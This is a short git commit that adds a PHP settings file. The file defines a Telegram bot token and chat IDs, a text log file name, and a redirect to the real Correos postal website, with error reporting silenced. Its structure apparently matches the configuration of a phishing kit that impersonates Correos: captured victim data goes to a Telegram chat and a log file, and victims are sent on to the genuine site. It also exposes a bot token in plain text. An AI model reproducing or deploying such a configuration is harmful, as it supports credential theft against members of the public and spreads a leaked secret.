f6bfa82354fb2fe89ed63975cc6ca90b24b2af9c
YOUSEfrigalo <110249418+YOUSEfrigalo@users.noreply.github.com>
2022-11-30 01:34:38 +0100

    C

---
+++ settings/conf.php
@@ -0,0 +1,13 @@
+<?php
+
+error_reporting(0);
+
+define("TELEGRAM_TOKEN", "5856755195:AAHlySNc4BZ80yzJbHpcRKJAYCYqaf5vegI");
+define("TELEGRAM_CHAT_ID", "-863944893");
+define("TELEGRAM_CHAT_IDD", "-863944893");
+define("TXT_FILE_NAME", 'mjinina.txt');
+define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");
+
+
+
+?>
